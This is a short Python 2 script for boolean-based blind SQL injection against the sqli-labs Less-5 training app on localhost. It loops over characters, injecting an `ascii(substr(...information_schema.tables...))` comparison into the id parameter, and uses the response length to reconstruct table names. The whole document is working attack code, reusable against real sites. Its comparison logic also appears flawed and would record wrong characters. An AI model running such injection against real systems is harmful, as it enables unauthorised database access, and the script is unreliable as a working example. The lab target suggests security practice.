#coding=utf-8
#表名
import requests
chuan='#ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'
url='http://127.0.0.1/sqli-labs-master/Less-5/?id=1'
a=requests.get(url)
tablename=''
#print a.text
#print len(a.text)
for k in range(0,9):
    tablename=''
    for i in range(1,9):
        for j in chuan:
            con = r"%27and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1))>'{2}'%23".format(
                k, i, ord(j))
            newurl = url + con
            a = requests.get(newurl)
            #print newurl
            # print len(a.text)
            # print j
            if (len(a.text) > 704):
                # print newurl
                print j
                tablename += j
                # print flag
                break
    print tablename

            

